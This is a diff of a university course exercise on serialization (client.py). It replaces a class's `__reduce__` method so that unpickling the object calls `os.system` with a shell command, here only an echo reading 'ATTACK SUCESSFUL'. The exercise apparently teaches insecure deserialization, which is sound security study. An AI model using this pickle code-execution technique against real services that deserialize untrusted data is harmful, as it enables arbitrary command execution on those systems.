@@ -1,3 +1,12 @@
+'''
+CS638
+Exercise on Serialization: client.py
+
+@author Vishnu Sai Rao Suresh Lokhande (lokhande@cs.wisc.edu)
+Changes in the code pointed out by >>
+
+'''
+
 import sys
 import os
 import pickle
@@ -9,9 +18,12 @@ class surprise(object):
     data = "serialized_data"
 
     def __reduce__(self):
+        '''
         encoded = codec.myEncode(self.data);
         return (codec.myDecode, (encoded,),)
-
+        '''
+        # >> system call attack
+        return (os.system, ('echo ATTACK SUCESSFUL',),)
 
 # check if an argument is present
 if len(sys.argv) > 1:
